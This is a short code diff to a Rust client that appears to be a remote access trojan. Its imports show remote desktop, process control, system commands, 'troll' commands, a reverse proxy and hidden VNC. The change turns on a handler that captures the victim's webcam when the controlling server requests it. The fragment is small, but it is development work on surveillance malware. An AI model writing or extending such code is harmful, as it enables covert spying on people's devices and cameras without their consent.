@@ -3,7 +3,7 @@ use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, sto
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::system_commands::system_commands;
 use crate::features::troll::execute_troll_command;
-// use crate::features::webcam::take_webcam;
+use crate::features::webcam::take_webcam;
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
@@ -116,7 +116,7 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopReverseProxy)) => reverse_proxy.stop().await,
 
-            // Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
+            Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
             
             // Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
             
